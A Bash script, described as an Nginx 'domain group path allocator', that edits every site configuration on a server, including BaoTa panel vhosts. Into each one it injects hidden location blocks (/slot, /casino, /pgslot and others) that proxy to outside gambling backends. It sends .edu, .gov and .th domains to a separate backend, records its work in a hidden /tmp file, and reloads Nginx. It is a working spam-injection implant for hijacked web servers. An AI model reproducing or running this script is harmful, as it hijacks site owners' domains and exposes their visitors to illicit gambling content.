#!/bin/bash
# nginx_per_domain_group.sh v5.2.1 永不翻车·自动适配所有系统终极版
# 新增功能：
#   1. 完美支持宝塔面板（自动识别 /www/server/panel/vhost目录）
#   2. 宝塔环境下使用宝塔官方重启方式：/www/server/nginx/sbin/nginx -s reload
#   3. 非宝塔继续使用系统 nginx 命令
#   4. 支持 .edu / .gov / .th → th.cogicpt.org（共用 IN 路径池）
# 修复问题：
#   - 修复第122行语法错误：[[ -f "$f" && -r "$f" == "$NGINX_CONF_ROOT/nginx.conf" ]] 中的双等号写法错误
set -euo pipefail

# ==================== 自动探测所有可能的 Nginx 配置目录 ====================
NGINX_CONF_ROOT="/etc/nginx"
BT_VHOST_ROOT="/www/server/panel/vhost/nginx"   # 宝塔独有目录（优先级最高）

# 常见配置目录（按优先级排序）
SITES_ENABLED="$NGINX_CONF_ROOT/sites-enabled"
SITES_AVAILABLE="$NGINX_CONF_ROOT/sites-available"
CONF_D="$NGINX_CONF_ROOT/conf.d"

# 最终收集所有真实配置文件的临时列表
FILE_LIST=$(mktemp)
RESULT_LIST=$(mktemp)
NEW_RECORDS=$(mktemp)
GLOBAL_MAP="/tmp/.domain_group_map.conf"

# 路径池定义
COM_PATHS=("help" "news" "page" "blog" "about" "support" "info")
IN_PATHS=("pg" "pgslot" "slot" "game" "casino" "live")  # th.cogicpt.org 共用此池

MAX_TRIES=200
processed=0
global_modified=0
total_files=0

touch "$GLOBAL_MAP" 2>/dev/null || true
: > "$GLOBAL_MAP"
: > "$RESULT_LIST"
: > "$NEW_RECORDS"
: > "$FILE_LIST"

# 三种后端模板
COM_TEMPLATE='
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host xzz.pier46.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://xzz.pier46.com;
    }'

IN_TEMPLATE='
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host ide.hashbank8.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://ide.hashbank8.com;
    }
'

TH_TEMPLATE='
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host th.cogicpt.org;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://th.cogicpt.org;
    }
'

# 读取历史映射
declare -A HIST_MAP
while IFS=':' read -r hash path backend; do
    [[ -n "$hash" ]] && HIST_MAP["$hash"]="$path:$backend"
done < "$GLOBAL_MAP"

echo "=== Nginx 域名组路径分配器（v5.2.1 自动适配所有系统 + 宝塔完美支持）==="
echo "自动探测并处理所有 Nginx 配置文件（含宝塔面板 vhost 目录）"
echo "支持 .edu / .gov / .th → th.cogicpt.org（共用 IN 路径池）"
echo

# ==================== 超级收集函数：兼容所有系统 + 宝塔 ====================
collect_all_real_nginx_configs() {
    # 1. 优先处理宝塔面板专属目录（优先级最高）
    if [[ -d "$BT_VHOST_ROOT" ]]; then
        find "$BT_VHOST_ROOT" -type f -name "*.conf" 2>/dev/null | while read -r f; do
            [[ -f "$f" && -r "$f" && -w "$f" ]] && grep -Fxq "$f" "$FILE_LIST" || echo "$f" >> "$FILE_LIST"
        done
    fi

    # 2. sites-enabled 中的软链接 → 解析到真实文件
    [[ -d "$SITES_ENABLED" ]] && find "$SITES_ENABLED" -type l -exec readlink -f {} \; 2>/dev/null | while read -r f; do
        [[ -f "$f" && -r "$f" && -w "$f" ]] && grep -Fxq "$f" "$FILE_LIST" || echo "$f" >> "$FILE_LIST"
    done

    # 3. conf.d 下的所有 .conf 文件
    [[ -d "$CONF_D" ]] && find "$CONF_D" -type f -name "*.conf" 2>/dev/null | while read -r f; do
        [[ -f "$f" && -r "$f" && -w "$f" ]] && grep -Fxq "$f" "$FILE_LIST" || echo "$f" >> "$FILE_LIST"
    done

    # 4. sites-available 下的 .conf 文件
    [[ -d "$SITES_AVAILABLE" ]] && find "$SITES_AVAILABLE" -type f -name "*.conf" 2>/dev/null | while read -r f; do
        [[ -f "$f" && -r "$f" && -w "$f" ]] && grep -Fxq "$f" "$FILE_LIST" || echo "$f" >> "$FILE_LIST"
    done

    # 5. /etc/nginx/ 根目录下所有 .conf 文件（排除主配置文件 nginx.conf）
    find "$NGINX_CONF_ROOT" -maxdepth 1 -type f -name "*.conf" 2>/dev/null | while read -r f; do
        if [[ "$f" == "$NGINX_CONF_ROOT/nginx.conf" ]]; then
            continue
        fi
        [[ -f "$f" && -r "$f" && -w "$f" ]] && grep -Fxq "$f" "$FILE_LIST" || echo "$f" >> "$FILE_LIST"
    done
}

collect_all_real_nginx_configs

# 去重并统计
sort -u "$FILE_LIST" -o "$FILE_LIST"
total_files=$(wc -l < "$FILE_LIST")
echo "共发现 $total_files 个真实配置文件待处理"
[[ $total_files -eq 0 ]] && echo "错误：未找到任何 Nginx 配置文件！请检查 Nginx 安装情况" && exit 1
echo

# ==================== 主处理循环（保持原有三重防重逻辑）===================
while IFS= read -r file; do
    [[ -n "$file" ]] || continue
    processed=$((processed + 1))
    echo "→ [$processed/$total_files] 正在处理：$(basename "$file")"

    if grep -qE "(xzz\.pier46\.com|ide\.hashbank8\.com|th\.cogicpt\.org)" "$file"; then
        echo " └ [已处理] 文件已包含任一后端，跳过"
        continue
    fi

    modified=0
    temp_new=$(mktemp)

    if ! csplit -z -f "/tmp/block_" "$file" '/^server[[:space:]]*{/' '{*}' >/dev/null 2>&1; then
        echo " └ 无 server 块，跳过"
        rm -f "$temp_new"
        continue
    fi

    for block_file in /tmp/block_*; do
        [[ -s "$block_file" ]] || continue

        if grep -qE "(xzz\.pier46\.com|ide\.hashbank8\.com|th\.cogicpt\.org)" "$block_file"; then
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        fi

        real_domains=$(awk '
            /^[[:space:]]*server_name[[:space:]]+/ && !/^[[:space:]]*#/ {
                gsub(/^[[:space:]]*server_name[[:space:]]+/, "")
                gsub(/;.*$/, ""); gsub(/#.*$/, ""); gsub(/[[:space:]]+$/, "")
                print
            }
        ' "$block_file" | tr ' \t' '\n' | grep -v '^$' | sort -u | grep -E '^([a-zA-Z0-9][a-zA-Z0-9-]*\.)+[a-zA-Z]{2,}$' || true)

        [[ -n "$real_domains" ]] || { cat "$block_file" >> "$temp_new"; rm -f "$block_file"; continue; }

        domain_key=$(echo "$real_domains" | sort -u | paste -sd ' ' - | sed 's/[[:space:]]*$//')
        hash=$(echo "$domain_key" | tr ' ' '_' | md5sum | awk '{print $1}')

        if [[ -n "${HIST_MAP[$hash]:-}" ]]; then
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        fi

        # ==================== 后端分配逻辑 ====================
        if echo "$real_domains" | grep -qiE '\.(edu|gov)$' || echo "$real_domains" | grep -qiE '\.th$'; then
            backend="th.cogicpt.org"
            template="$TH_TEMPLATE"
            pool=("${IN_PATHS[@]}")
        elif echo "$domain_key" | grep -qE '\.(in|id)\b'; then
            backend="ide.hashbank8.com"
            template="$IN_TEMPLATE"
            pool=("${IN_PATHS[@]}")
        else
            backend="xzz.pier46.com"
            template="$COM_TEMPLATE"
            pool=("${COM_PATHS[@]}")
        fi

        path=""
        for ((i=0; i<MAX_TRIES; i++)); do
            candidate="${pool[RANDOM % ${#pool[@]}]}"
            if ! grep -q ":$candidate:$backend$" "$GLOBAL_MAP" && ! grep -q ":$candidate:$backend$" "$NEW_RECORDS"; then
                path="$candidate"
                break
            fi
        done

        [[ -n "$path" ]] || { cat "$block_file" >> "$temp_new"; rm -f "$block_file"; continue; }

        echo "$hash:$path:$backend" >> "$NEW_RECORDS"
        echo -e "$domain_key\t$path\t$backend" >> "$RESULT_LIST"

        location_block=$(echo "$template" | sed "s/%PATH%/$path/g")

        awk -v loc="$location_block" '
        /^[[:space:]]*server_name[[:space:]]+/ && !/^[[:space:]]*#/ {
            line = $0
            if (!inserted) { print line; print loc; inserted = 1 } else { print line }
            next
        }
        { print }
        END { if (!inserted) print loc }
        ' "$block_file" > "$temp_new.block"

        cat "$temp_new.block" >> "$temp_new"
        rm -f "$temp_new.block" "$block_file"

        echo " └ [成功注入] /$path/ → $backend ($domain_key)"
        modified=$((modified + 1))
        global_modified=$((global_modified + 1))
    done

    [[ $modified -gt 0 ]] && mv "$temp_new" "$file" && echo " └ 文件已更新"
    [[ $modified -eq 0 ]] && rm -f "$temp_new"
    rm -f /tmp/block_* 2>/dev/null || true
    echo
done < "$FILE_LIST"

# ==================== 智能重启 Nginx（宝塔 vs 普通系统）===================
smart_reload_nginx() {
    if [[ -d "/www/server/panel" && -x "/www/server/nginx/sbin/nginx" ]]; then
        echo "检测到宝塔面板环境 → 使用宝塔官方 Nginx 重启方式"
        if /www/server/nginx/sbin/nginx -t >/dev/null 2>&1; then
            /www/server/nginx/sbin/nginx -s reload && echo "宝塔 Nginx 已成功重载"
        else
            echo "宝塔 Nginx 配置测试失败，请手动检查语法"
        fi
    else
        echo "使用系统 Nginx 重启方式"
        if nginx -t >/dev/null 2>&1; then
            nginx -s reload && echo "Nginx 已成功重载"
        else
            echo "Nginx 配置测试失败，请手动检查"
        fi
    fi
}

# ==================== 收尾工作 ====================
[[ -s "$NEW_RECORDS" ]] && { cat "$NEW_RECORDS" >> "$GLOBAL_MAP"; sort -u "$GLOBAL_MAP" -o "$GLOBAL_MAP"; }

echo "========================================================================"
echo "处理完成！共处理 $processed 个文件，新注入 $global_modified 个域名组"
[[ $global_modified -gt 0 ]] && smart_reload_nginx
[[ $global_modified -eq 0 ]] && echo "本次运行无新注入（所有域名组均已处理）"
echo "当前全局管理 $(wc -l < "$GLOBAL_MAP") 个域名组映射"
echo "========================================================================"

[[ -s "$RESULT_LIST" ]] && {
    echo "本次新增注入记录："
    column -t -s $'\t' "$RESULT_LIST" | awk '{printf " %-56s → /%-10s → %s\n", $1, $2, $3}'
}

rm -f "$RESULT_LIST" "$NEW_RECORDS" "$FILE_LIST" /tmp/block_* 2>/dev/null || true

exit 0
